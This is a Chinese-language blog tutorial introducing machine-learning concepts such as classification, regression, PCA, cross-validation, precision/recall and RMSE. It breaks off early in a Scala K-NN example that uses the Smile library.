&lt;p&gt;第一部分“机器学习的整体框架”包含了学习下文应用实例要用到的所有重要概念。“应用实例”这一部分参考了&lt;a href=&quot;http://shop.oreilly.com/product/0636920018483.do&quot;&gt;《Machine Learning for Hackers》&lt;/a&gt;这本书的例子。另外，&lt;a href=&quot;http://www.manning.com/pharrington/&quot;&gt;《Machine Learning in Action》&lt;/a&gt;这本书将用于验证。&lt;/p&gt;
&lt;p&gt;第二部分“应用实例”包含了各种机器学习 (ML) 应用实例，以 Smile 作为 ML 库。&lt;/p&gt;
&lt;p&gt;注意在本文中，“新”定义会添加超链接，以备读者了解该主题的更多相关内容，但是完成这些实例，并不需要阅读全部的内容。&lt;/p&gt;
&lt;p&gt;最后，我想感谢以下这些人:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;a href=&quot;https://www.linkedin.com/in/haifengli&quot;&gt;Haifeng Li &lt;/a&gt;： 感谢他给予的支持，还写了那么出色、且能免费使用的 Smile 库。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://www.linkedin.com/profile/view?id=1490860&quot;&gt;Erik Meijer&lt;/a&gt;： 感谢在我写这篇博文的时候他给予的建议与指导。&lt;/li&gt;
&lt;li&gt;
&lt;a href=&quot;https://www.linkedin.com/profile/view?id=138460950&quot;&gt;Richard van Heest&lt;/a&gt; 、&lt;a href=&quot;https://www.linkedin.com/profile/view?id=355522383&quot;&gt;Lars Willems&lt;/a&gt;： 感谢他们审阅了这篇博文并做了反馈。&lt;/li&gt;
&lt;/ul&gt;
&lt;h1&gt;机器学习的整体框架&lt;/h1&gt;
&lt;p&gt;也许你曾听说过机器学习这个概念。然而，如果要你向另一个人解释什么是机器学习，你要怎么做呢？在继续阅读之前，请先考虑一下这个问题。&lt;/p&gt;
&lt;p&gt;机器学习有很多不同的定义方式，其中一些更加精确，然而，在这些定义中也有许多不一致之处。有些定义认为机器学习就是根据历史数据建立一个静态的模型，然后可以用于预测未来的数据。另一些则认为随着数据的增加，它是一个随时间不断变化的动态模型。&lt;/p&gt;
&lt;p&gt;我是比较支持动态说的，但是由于某些限制，我们的实例只用来阐释静态的模型方法。不过，在动态机器学习这一节中，我们也对动态原则怎样运作做了解释。&lt;/p&gt;
&lt;p&gt;接下来的这一部分给出了机器学习中常用的定义和概念。我们建议读者在进入应用实例的学习之前先通读这部分。&lt;/p&gt;
&lt;h2&gt;特征&lt;/h2&gt;
&lt;p&gt;一个特征就是用来训练模型的一种性质。例如，基于文字“买”和“钱”出现的频率可以把邮件分类为垃圾邮件和正常邮件。这些用来分类的单词就是特征，如果把它们与其他单词组合在一起，那它们就是特征的一部分。如果你想用机器学习来预测一个人是否是你的朋友，那么“共同的朋友”可以作为一个特征。注意，在这个领域中，特征有时也指&lt;strong&gt;属性&lt;/strong&gt;。&lt;/p&gt;
&lt;h2&gt;模型&lt;/h2&gt;
&lt;p&gt;一提到机器学习，&lt;strong&gt;模型&lt;/strong&gt;是经常会碰到的一个术语。模型就是一种机器学习方法的结果以及该方法采用的算法。这个模型可以在监督学习中用来做预测，或者在无监督学习中用来检索聚类。在这个领域中，&lt;strong&gt;在线训练&lt;/strong&gt;和&lt;strong&gt;离线训练&lt;/strong&gt;这两个术语也有很大机会见到。在线训练指的是往一个已经存在的模型中添加训练数据，而离线训练指的是从头开始建立一个新模型。由于性能原因，在线训练方法是最可取的。然而，对某些算法来说，也有例外。&lt;/p&gt;
&lt;h2&gt;学习方法&lt;/h2&gt;
&lt;p&gt;在机器学习领域中，有两种前沿的的学习方式，也就是监督学习和无监督学习，简要地介绍一下还是很有必要的，因为在机器学习的应用中，选择合适的机器学习方法和算法是一个重要而有时又有点乏味的过程。&lt;/p&gt;
&lt;h3&gt;监督学习&lt;/h3&gt;
&lt;p&gt;在监督学习中，你可以明确地定义要使用的特征，以及你预期的输出结果。例如，通过身高和体重预测性别，这是一个分类的问题。此外，你还可以通过回归分析预测绝对值。用同样的数据做回归分析的一个例子是通过性别和体重预测一个人的身高。某些监督算法只能用来解决分类问题和回归分析中的一种，例如 K-NN。不过也有一些算法如 Support Vector Machines 在两种情况下都适用。&lt;/p&gt;
&lt;h4&gt;分类&lt;/h4&gt;
&lt;p&gt;在监督学习的范围内，分类问题是相对简单的。考虑一组标签以及一些已经打上正确标签的数据，我们想要做的就是为新数据预测标签。然而，在把数据考虑为分类问题之前，你应该分析一下数据的特点。如果数据的结构明显可以让你轻松地画出一条回归线，那么应用回归算法反而会更好。如果数据无法拟合出一条回归线，或者当算法的性能不理想时，那么分类就是一个很好的选择。&lt;/p&gt;
&lt;p&gt;分类问题的一个例子是，根据邮件的内容把邮件分为正常或垃圾邮件。考虑一个训练组，其中的邮件被标为正常或垃圾，可以应用一个分类算法来训练模型。这个模型就可以用来预测未来的邮件是正常或是垃圾。分类算法的一个典型的例子是 K-NN 算法，分类问题的常用实例是将邮件分为垃圾邮件或正常邮件，这也是本文当中使用到的例子之一。&lt;/p&gt;
&lt;h4&gt;回归&lt;/h4&gt;
&lt;p&gt;回归要比分类要强大很多。这是因为，回归分析预测的是实际值而不是标签。一个简单的例子可以说明这一点。考虑一个表格，其中包含体重、身高和性别等数据，当给定一个体重和身高数据时，你可以应用 K-NN 算法来预测某人的性别。对这个同样的数据集使用回归分析，如果是给定性别以及其他各个缺失的参数，反过来，你可以预测某人的体重或身高。&lt;/p&gt;
&lt;p&gt;能力越大，责任就越大，所以在用回归分析建立模型时必须格外小心。常见的陷阱是过拟合、欠拟合以及对模型如何控制&lt;a href=&quot;http://en.wikipedia.org/wiki/Extrapolation&quot;&gt;外推法&lt;/a&gt;与&lt;a href=&quot;http://en.wikipedia.org/wiki/Interpolation&quot;&gt;内插法&lt;/a&gt;欠缺考虑。&lt;/p&gt;
&lt;h3&gt;无监督学习&lt;/h3&gt;
&lt;p&gt;相比监督学习，无监督学习不需要你事先确切地了解输出结果。应用无监督学习的中心思想是发掘出一个数据集内在的结构。PCA 就是一个例子，它通过组合特征从而减小特征数。 组合过程基于这些特征之间可能隐含的关联。另一个无监督学习的例子是 K-均值聚类。K-均值聚类就是要找出一个数据集中的分组，之后这些分组可以用于其他目的，例如用于监督学习中。&lt;/p&gt;
&lt;h4&gt;主成分分析（PCA）&lt;/h4&gt;
&lt;p&gt;主成分分析是统计学中的一种技术，它用于将一组相关列转化为较小的一组无关列，以化简一个问题的特征数。这组较小的列就叫做主成分。这种技术主要用于探索性数据分析中，因为它揭示了数据中的内部结构，这样的结构无法直观地看出来。&lt;/p&gt;
&lt;p&gt;PCA 一个最大弱点就是数据中的异常值。这些异常值严重地影响了结果，所以，事先观察数据，排除较大的异常值能够极大地提高这种方法的性能。&lt;/p&gt;
&lt;p&gt;为了清楚 PCA 到底是做什么用的，我们将一组二维点数据的图与同样数据经 PCA 处理后的图作了对比。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/0e159a97474030abd64c8e3230f80762.jpg&quot; width=&quot;350px&quot;&gt; &lt;img src=&quot;/images/jobbole.com/3f29b8395bf1e7e62b9b1271bdd4eec7.jpg&quot; width=&quot;330px&quot;&gt;&lt;/p&gt;
&lt;p&gt;原始数据表示在左图中，其中每个颜色表示不同的类别。显然，这些数据可以从二维约化到一维之后，仍然能够恰当的分类。这就是 PCA 被提出的缘故了。根据每个数据点的原始维度，通过 PCA 可以计算出一个新的值来。&lt;/p&gt;
&lt;p&gt;右图是对这些数据点应用了 PCA 后的结果。注意，这些数据有一个y值，但这纯粹是为了能够将数作图展示出来。所有这些数据点的Y值都是0，因为 PCA 算法只返回 X 值。同时注意，右图数据点中的 X 值并不对应左图中各点的X值，这表明 PCA 并不仅仅是“丢掉”一个维度。&lt;/p&gt;
&lt;h2&gt;验证技术&lt;/h2&gt;
&lt;p&gt;在这部分中我们会介绍一些用于模型验证的技术方法，以及一些与机器学习验证方法相关的专业术语。&lt;/p&gt;
&lt;h3&gt;交叉验证&lt;/h3&gt;
&lt;p&gt;交叉验证法是机器学习领域中最常用的验证方法之一。它的基本思想是，将原始数据分为训练集和验证集，先用训练集对模型进行训练，然后再用模型来预测验证集的数据。将预测值与实际值进行对比，以此来评价模型的性能和训练数据的质量。&lt;/p&gt;
&lt;p&gt;这种交叉验证法最重要的环节是分割数据。应用这种方法时，应该始终使用整个数据集。换言之，你不可以随机选取 X 个数据点作为训练集然后随机选取X个数据点作为验证集，这样的话，在两个数据集中可能就有些点是重复的，而另一些点又没有被利用到。&lt;/p&gt;
&lt;h4&gt;2-折交叉验证&lt;/h4&gt;
&lt;p&gt;在2-折交叉验证中，每一“折”（所以要执行两次）都要将数据分割为验证集和训练集，用训练集训练模型，再用验证集做验证。这样做就可以在验证模型时计算两次误差。这些误差值不应该相差太大。万一差太大，那么不是你的数据有问题，就是你选来建立模型的特征有问题。无论是哪种情况，你都应该再看看数据，找出具体的问题，因为以数据为基础来训练一个模型有可能因为错误数据而出现模型过度拟合的情况。&lt;/p&gt;
&lt;h3&gt;正则化&lt;/h3&gt;
&lt;p&gt;正则化的基本思想是，通过简化一个模型而防止它过度拟合。假设你的数据满足一个三次多项式函数，但是数据中有噪声，这会使模型函数的次数加高一级。于是，尽管模型刚开始好像不错，但碰到新的数据就表现不理想了。正则化通过一个特定的 λ 值来简化模型，有利于防止这种情况的发生。然而，要找到一个合适的 λ 值却不易，因为你不知道模型什么时候才会过度拟合。这也是交叉验证法经常被用来寻找适合模型的最佳 λ 值的原因。&lt;/p&gt;
&lt;h3&gt;精确率&lt;/h3&gt;
&lt;p&gt;在计算机科学中，我们用精确率这个术语来描述相关的选中条目的数量。因此，当你计算一个文档搜索算法的精确率时，那个算法的精确率就定义为在设定的结果中有多少个文档是确实相关的。&lt;/p&gt;
&lt;p&gt;这个值由下式算出：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/ed008fc69b3669662c71a8692d6371ce.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;掌握这个内容可能会有点难，所以我举个例子：&lt;/p&gt;
&lt;p&gt;假设有一个完备的文档集 {aa，ab，bc，bd，ee}，我们要查找名字带有 a 的文档。如果算法返回的文档集是 {aa，ab}，那么直觉告诉我们精确率是100%。我们可以代入公式验证一下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/21232ad2cc83f223430c74474056d426.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;事实上就是100%。如果我们再查找一次，除了{aa，ab}这个结果，我们还得到{bc，de}这个结果，精确率就会受到影响如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/e7de0fc4137417ba501b90734772cba3.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;这里，结果中包含了相关的结果，也包含了两个不相关的结果，导致精确率降低了。然而，如果给这个例子计算召回率，那它将是100%，这就是精确率与召回率之间的不同之处。&lt;/p&gt;
&lt;h3&gt;召回率&lt;/h3&gt;
&lt;p&gt;召回率是指，给定查找条件和一个数据集，算法检索到的相关条目的数量。因此，给定一组文档以及能够返回一个文档子集的查找条件，召回率就表示相关的文档中有多少被实际返回。召回率由下式计算：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/5f305f1eac1aed686532bf0825826c21.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;我们举个例子看看如何应用该公式：&lt;/p&gt;
&lt;p&gt;假设有一个完备的文档集 { aa, ab, bc, bd, ee }，我们要查找名字带有a的文档。如果算法返回{aa，ab}，那么召回率显然就是100%。我们可以代入公式验证一下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/e411e297b869baa3bdb75d3d614512cc.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;事实上就是100%。下面我们看看如果算法只返回部分相关结果会怎么样：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/7136c23f5e5425054e54964848f7a7ec.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;这里，结果只包含一半的相关结果，导致召回率降低了。然而，如果计算这种情况下的精确率，结果是会100%，因为所有返回结果都是相关的。&lt;/p&gt;
&lt;h3&gt;先验&lt;/h3&gt;
&lt;p&gt;给定一个数据点，一个分类器的先验值代表了这个数据点属于该分类器的可能性大小。在实践中，这意味着当你在一个数据点处得到一个预测值时，先验值就表示模型对那个数据点的分类的确信度有多高。&lt;/p&gt;
&lt;h3&gt;均方根误差（RMSE）&lt;/h3&gt;
&lt;p&gt;均方根误差（RMSE 或 RMSD，D 代表 deviation，即偏差）是指对实际值与预测值之差先平方，再求均值，然后开方。我举个例子来解释一下好帮助理解。假设我们有以下数据：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://jbcdn2.b0.upaiyun.com/2015/10/9ea703fa817417d65f4aac3bffce9566.jpg&quot;&gt;&lt;img class=&quot;aligncenter size-full wp-image-59777&quot; src=&quot;/images/jobbole.com/5e57c8f8bcafd61c4e3abece7d422e5e.jpg&quot; alt=&quot;Capture&quot; width=&quot;800&quot; height=&quot;104&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;模型的平方差的均值是 4.33333，该值的平方根是 2.081666. 因此，该模型的预测值的平均误差为 2.08。RMSE 值越低，模型的预测效果越好。这就是为什么在选择特征时，人们会分别计算包含和不包含某个特征的 RMSE 值，以判断那个特征是如何影响模型的性能的。通过这些信息，人们就可以确定，和模型的效率提升比起来，由于该特征值增加的额外的计算时间是否值得。&lt;/p&gt;
&lt;p&gt;此外，因为 RMSE 值是一个绝对值，所以它可以归一化以进行模型之间的比较。这就是归一化均方根误差 (NRMSE)。然而，要计算这个值，首先要知道系统所包含的最小值与最大值。假设我们有一个最小值为 5 度、最大值为 25 度的温度范围，那么可用下式来计算 NRMSE 值：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/d0e8fe0ff1c1346e5ef0ead7483b61ce.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;若代入实际值，可得到如下结果：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/57c4b408ff9fc1c17116fb7f0bd93891.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;那这个 10.4 表示什么呢？这是模型对数据点进行预测的平均误差百分数。&lt;/p&gt;
&lt;p&gt;最后，我们可以利用 RMSE 值来计算拟合度 (R Squared)。拟合度反映的是，与各个值的平均值作比较（不考虑模型的情况），模型的预测效果有多好。我们首先要计算出平均法的 RMSE 值。对上文的表格最后一列值的取平均，结果是 4.22222，其平方根是 2.054805。首先注意到这个值比模型的值要小。这不是个好现象，因为这表明模型的预测效果比单单取平均值要差。然而，我们主要是演示怎么计算拟合度，所以我们继续计算过程。&lt;/p&gt;
&lt;p&gt;现在，模型与平均法的 RSME 值都求出来了，接着用下式计算拟合度：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://jbcdn2.b0.upaiyun.com/2015/10/16547ab7cd650ee1bbdc0d9934df6d7a.png&quot;&gt;&lt;img class=&quot;size-full wp-image-59801 alignnone&quot; src=&quot;/images/jobbole.com/b5295f3e2dc58cf635a4bdf607f3be39.jpg&quot; alt=&quot;Formula2&quot; width=&quot;263&quot; height=&quot;57&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;代入实际值得到以下结果：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://jbcdn2.b0.upaiyun.com/2015/10/84c414713a61e768997f6bcb25ebfbe1.png&quot;&gt;&lt;img class=&quot;size-full wp-image-59802 alignnone&quot; src=&quot;/images/jobbole.com/ece1c813e7602f4033dcb59419896bb9.jpg&quot; alt=&quot;Formula3&quot; width=&quot;328&quot; height=&quot;51&quot;&gt;&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;那么，-1.307229 代表什么呢？它就是表示模型每次对一个值的预测效果比平均法差约 1.31%。换言之，在这个具体情况中，用平均法来做预测比用模型的效果要好。&lt;/p&gt;
&lt;h2&gt;常见陷阱&lt;/h2&gt;
&lt;p&gt;这部分要介绍的是在应用机器学习技术的过程中经常会碰到的问题，主要内容是向读者解析这些陷阱以帮助读者避开它们。&lt;/p&gt;
&lt;h3&gt;过度拟合&lt;/h3&gt;
&lt;p&gt;对数据进行拟合时，数据本身可能会包含噪声（例如有测量误差）。如果你精确地把每一个数据点都拟合进一个函数中，那你会把噪声也耦合到模型中去。这虽然能使模型在预测测试数据时表现良好，但在预测新数据时会相对较差。&lt;/p&gt;
&lt;p&gt;把数据点和拟合函数画在图表中，下列左图反映过度拟合的情况，右图表示一条穿过数据点的回归曲线，它对数据点能够&lt;strong&gt;适当拟合&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/7c1767b7ab8cd3960c193be6ddc1d880.jpg&quot; width=&quot;300px&quot;&gt; &lt;img src=&quot;/images/jobbole.com/f5e06b1c66c4d097e81bb4f09a891437.jpg&quot; width=&quot;300px&quot;&gt;&lt;/p&gt;
&lt;p&gt;应用回归分析时容易产生过度拟合，也很容易出现在朴素贝叶斯分类算法中。在回归分析中，产生过度拟合的途径有舍入操作、测量不良和噪声数据。在朴素贝叶斯分类算法中，选定的特征可能导致过度拟合。例如，对垃圾和正常邮件的分类问题保留所有停用词。&lt;/p&gt;
&lt;p&gt;通过运用验证技术、观察数据的统计特征以及检测和剔除异常值，可以检测出过度拟合。&lt;/p&gt;
&lt;h3&gt;欠拟合&lt;/h3&gt;
&lt;p&gt;当你对数据进行建模时，把很多统计数据都遗漏掉了，这叫做欠拟合。有很多原因可以导致欠拟合，例如，对数据应用不合适的回归类型。如果数据中包含了非线性结构，而你却运用线性回归，这就产生了一个欠拟合模型。下列左图代表了一条欠拟合的回归线，右图右图表示一条合适的回归线。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/c9b7bbc9f31efccc8a89fa4c9b8d8f0d.jpg&quot; width=&quot;300px&quot;&gt; &lt;img src=&quot;/images/jobbole.com/f5e06b1c66c4d097e81bb4f09a891437.jpg&quot; width=&quot;300px&quot;&gt;&lt;/p&gt;
&lt;p&gt;为了防止欠拟合，你可以画出数据点从而了解数据的内在结构，以及应用验证技术，例如交叉验证。&lt;/p&gt;
&lt;p&gt;维度灾难&lt;/p&gt;
&lt;p&gt;对于已知的数据量存在一个最大的特征数（维数），当实际用于建立机器模型的特征数超过这个最大值时，就产生维度灾难问题。矩阵秩亏就是这样的一种问题。&lt;a href=&quot;http://en.wikipedia.org/wiki/Ordinary_least_squares&quot;&gt;普通最小二乘 (OLS) 算法&lt;/a&gt;通过解一个线性系统来建立模型。然而，如果矩阵的列数多于行数，那这个系统不可能有唯一解。最好的解决办法是获取更多数据点或者减小特征数。&lt;/p&gt;
&lt;p&gt;如果读者想了解更多关于维度灾难的内容，可以参考&lt;a href=&quot;http://lectures.molgen.mpg.de/networkanalysis13/LDA_cancer_classif.pdf&quot;&gt;一个关于这方面的研究&lt;/a&gt;。在这个研究中，研究人员 Haifeng Li，Keshu Zhang 和 Tao Jiang 发展一种用少量数据点改善肿瘤分类的算法。他们还将其与&lt;a href=&quot;http://en.wikipedia.org/wiki/Support_vector_machine&quot;&gt;支持向量机&lt;/a&gt;和&lt;a href=&quot;http://en.wikipedia.org/wiki/Random_forest&quot;&gt;随机森林算法&lt;/a&gt;做了比较。&lt;/p&gt;
&lt;h2&gt;动态机器学习&lt;/h2&gt;
&lt;p&gt;在几乎所有你能找到的机器学习文献中，静态模型就是首先通过建立、验证流程，然后作预测或建议用途。然而在实践中，仅仅这样做还不足以应用好机器学习。所以，我们在这部分中将要介绍怎么样把一个静态模型改造成一个动态模型。因为（最佳的）实现是依赖于你所使用的算法的，所以我们将只作概念介绍而不给出实例了。鉴于文本解释不够清晰，我们首先用一个图表展示整个体系，然后用这个图表介绍机器学习以及如何做成一个动态系统。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/images/jobbole.com/b127c2ab272e91ad1156602550598928.jpg&quot;&gt;&lt;/p&gt;
&lt;p&gt;机器学习的基本流程如下：&lt;/p&gt;
&lt;p&gt;1、搜集数据&lt;/p&gt;
&lt;p&gt;2、把数据分割为测试集和训练集&lt;/p&gt;
&lt;p&gt;3、训练一个模型（应用某种机器学习算法）&lt;/p&gt;
&lt;p&gt;4、验证模型，验证方法需要使用模型和测试数据&lt;/p&gt;
&lt;p&gt;5、基于模型作出预测。&lt;/p&gt;
&lt;p&gt;在该领域的实际应用中，以上的流程是不完整的，有些步骤并未包含进去。在我看来，这些步骤对于一个智能学习系统来说至关重要。&lt;/p&gt;
&lt;p&gt;所谓的动态机器学习，其基本思路如下：模型作出预测后，将预测信息连同用户反馈一起返回给系统，以改善数据集和模型。那么，这些用户反馈是怎么获得的呢？我们以为 Facebook 的朋友推荐为例。用户面临两种选择：“添加朋友”或“移除”。基于用户的决定，对于那个预测你就得到了用户的直接反馈。&lt;/p&gt;
&lt;p&gt;因此，假设你获得了这些用户反馈，那么你可以对模型应用机器学习来学习这些用户反馈。听起来可能有点奇怪，我们会更详细地解释这一过程。然而在那之前，我们要做一个免责声明：我们关于脸书朋友推荐系统的解释是一个100%的假说，并且绝对没有经过脸书本身的证实。就我们所知，他们的系统对外是不公开的。&lt;/p&gt;
&lt;p&gt;假设该系统基于以下特征进行预测：&lt;/p&gt;
&lt;p&gt;1、共同朋友的数量&lt;br&gt;
2、相同的户籍&lt;br&gt;
3、相同的年龄&lt;/p&gt;
&lt;p&gt;然后你可以为脸书上的每一个人计算出一个先验值，这个先验值描述了他/她是你的朋友的概率有多大。假设你把一段时间内所有的预测信息都存储下来，就可以用机器学习分析这些数据来改善你的系统。更详细地说，假设大多数的“移除好友”推荐在特征 2 上具有较高评级，但在特征 1 上评级相对较低，那么我们可以给预测系统加入权重系数，让特征 1 比特征 2 更重要。这样就可以为我们改善推荐系统。&lt;/p&gt;
&lt;p&gt;此外，数据集随时间而增大，所以我们要不断更新模型，加入新数据，使预测更准确。不过，在这个过程中，数据的量级及其突变率起着决定性作用。&lt;/p&gt;
&lt;h1&gt;实例&lt;/h1&gt;
&lt;p&gt;在这部分中，我们结合实际环境介绍了一些机器学习算法。这些实例主要为了方便读者入门之用，因此我们不对其内在的算法作深入讲解。讨论的重点完全集中在这些算法的功能方面、如何验证算法实现以及让读者了解常见的陷阱。&lt;/p&gt;
&lt;p&gt;我们讨论了如下例子：&lt;/p&gt;
&lt;p&gt;基于下载/上传速度的互联网服务提供商标记法 (K-NN)&lt;br&gt;
正常/垃圾邮件分类（朴素贝叶斯法）&lt;br&gt;
基于内容的邮件排序（推荐系统）&lt;br&gt;
基于身高预测体重（线性回归：普通最小二乘法）&lt;br&gt;
尝试预测最畅销书排行（文本回归）&lt;br&gt;
应用无监督学习合并特征（主成分分析）&lt;br&gt;
应用支持向量机（支持向量机）&lt;/p&gt;
&lt;p&gt;我们在这些实例中都使用了 &lt;a href=&quot;https://github.com/haifengl/smile/releases&quot;&gt;Smile 机器学习&lt;/a&gt;库，包括 smile-core 和 smile-plot 这两个库。这些库在 &lt;a href=&quot;http://search.maven.org/&quot;&gt;Maven&lt;/a&gt;, Gradle, Ivy, SBT 和 Leiningen 等工具上都是可用的。如何把这些库添加到这些工具中去，对于 core 库，参考&lt;a href=&quot;https://www.versioneye.com/java/com.github.haifengl:smile-core/1.0.2&quot;&gt;这里&lt;/a&gt;，对于 plot 库，参考&lt;a href=&quot;https://www.versioneye.com/java/com.github.haifengl:smile-plot/1.0.2&quot;&gt;这里&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;所以，在开始做这些实例之前，我假定你在自己最喜欢的 IDE 上建立了一个新项目，并把 smile-core 库和 smile-plot 库添加到了你的项目中。其他需要用到的库以及如何获取实例的数据会在每个例子中分别予以说明。&lt;/p&gt;
&lt;h2&gt;基于下载/上传速度的互联网服务供应商标记法（使用 K-NN 算法、Smile 库、Scala 语言）&lt;/h2&gt;
&lt;p&gt;这一部分的主要目标是运用 K 最近邻算法，根据下载/上传速度对将&lt;a href=&quot;http://en.wikipedia.org/wiki/Internet_service_provider&quot;&gt;互联网服务供应商 (ISP&lt;/a&gt;) 分为 Alpha 类（由 0 代表）或 Beta 类（由 1 代表）。K-NN 算法的思路如下：给定一组已经分好类的点，那么，对新点的分类可以通过判别它的 K 个最近邻点的类别（K 是一个正整数）。K 个最近邻点可以通过计算新点与其周围点之间的欧氏距离来查找。找出这些邻近点，你就得到了最具代表性的类别，并将新点分到这一类别中。&lt;/p&gt;
&lt;p&gt;做这一案例需要先下载&lt;a href=&quot;http://xyclade.github.io/MachineLearning/Example%20Data/KNN_Example_1.csv&quot;&gt;示例数据&lt;/a&gt;。此外，还要把代码段中的路径改为你存储示例数据的地方。&lt;/p&gt;
&lt;p&gt;首先要加载 CSV 数据文件。这没什么难的，所以我直接给代码，不做进一步解释：&lt;/p&gt;
&lt;!-- Crayon Syntax Highlighter v2.7.1.1 --&gt;

		&lt;div id=&quot;crayon-587b19d06131c402465659&quot; class=&quot;crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate&quot; data-settings=&quot; touchscreen minimize scroll-mouseover&quot; style=&quot; margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
		
			&lt;div class=&quot;crayon-toolbar&quot; data-settings=&quot; show&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;span class=&quot;crayon-title&quot;&gt;&lt;/span&gt;
			&lt;div class=&quot;crayon-tools&quot; style=&quot;font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;&quot;&gt;
&lt;div class=&quot;crayon-button crayon-nums-button&quot; title=&quot;切换是否显示行编号&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-plain-button&quot; title=&quot;纯文本显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-wrap-button&quot; title=&quot;切换自动换行&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-expand-button&quot; title=&quot;点击展开代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;div class=&quot;crayon-button crayon-popup-button&quot; title=&quot;在新窗口中显示代码&quot;&gt;&lt;div class=&quot;crayon-button-icon&quot;&gt;&lt;/div&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
			&lt;div class=&quot;crayon-info&quot; style=&quot;min-height: 18.2px !important; line-height: 18.2px !important;&quot;&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-plain-wrap&quot;&gt;&lt;textarea wrap=&quot;soft&quot; class=&quot;crayon-plain print-no&quot; data-settings=&quot;dblclick&quot; style=&quot;-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;&quot;&gt;
object KNNExample {
   def main(args: Array[String]): Unit = {
    val basePath = &quot;/.../KNN_Example_1.csv&quot;
    val testData = getDataFromCSV(new File(basePath))
    }

  def getDataFromCSV(file: File): (Array[Array[Double]], Array[Int]) = {
    val source = scala.io.Source.fromFile(file)
    val data = source
        .getLines()
        .drop(1)
        .map(x =&amp;gt; getDataFromString(x))
        .toArray

    source.close()
    val dataPoints = data.map(x =&amp;gt; x._1)
    val classifierArray = data.map(x =&amp;gt; x._2)
    return (dataPoints, classifierArray)        
  }

  def getDataFromString(dataString: String): (Array[Double], Int) = {

    //Split the comma separated value string into an array of strings
    //把用逗号分隔的数值字符串分解为一个字符串数组
    val dataArray: Array[String] = dataString.split(&#39;,&#39;)

    //Extract the values from the strings
    //从字符串中抽取数值
    val xCoordinate: Double = dataArray(0).toDouble
    val yCoordinate: Double = dataArray(1).toDouble
    val classifier: Int = dataArray(2).toInt

    //And return the result in a format that can later 
    //easily be used to feed to Smile
    //并以一定格式返回结果，使得该结果之后容易输入到Smile中处理
    return (Array(xCoordinate, yCoordinate), classifier)
  }
}&lt;/textarea&gt;&lt;/div&gt;
			&lt;div class=&quot;crayon-main&quot; style=&quot;&quot;&gt;
				&lt;table class=&quot;crayon-table&quot;&gt;
					&lt;tr class=&quot;crayon-row&quot;&gt;
				&lt;td class=&quot;crayon-nums &quot; data-settings=&quot;show&quot;&gt;
					&lt;div class=&quot;crayon-nums-content&quot; style=&quot;font-size: 13px !important; line-height: 15px !important;&quot;&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06131c402465659-1&quot;&gt;1&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06131c402465659-2&quot;&gt;2&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06131c402465659-3&quot;&gt;3&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06131c402465659-4&quot;&gt;4&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06131c402465659-5&quot;&gt;5&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06131c402465659-6&quot;&gt;6&lt;/div&gt;
&lt;div class=&quot;crayon-num&quot; data-line=&quot;crayon-587b19d06131c402465659-7&quot;&gt;7&lt;/div&gt;
&lt;div class=&quot;crayon-num crayon-striped-num&quot; data-line=&quot;crayon-587b19d06131c402465659-8&quot;&gt;8&lt;/div&gt;
